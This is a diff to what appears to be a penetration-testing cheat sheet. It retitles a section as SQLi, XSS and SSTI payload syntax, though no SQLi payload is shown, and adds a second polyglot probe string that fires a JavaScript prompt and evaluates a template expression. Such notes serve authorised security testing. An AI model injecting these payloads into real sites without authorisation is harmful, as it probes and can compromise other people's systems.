@@ -142,10 +142,11 @@ mget *
 mget *.txt
 ```
 
-## Simple XSS & SSTI Payload Syntax
+## Simple SQLi, XSS & SSTI Payload Syntax
 
 ```
 '"><svg/onload=prompt(5);>{{7*7}}
+'"><svg/onload=prompt(document.domain);>{{5*5}}
 ```
 
 '"><svg/onload=prompt(5);>{{7*7}}
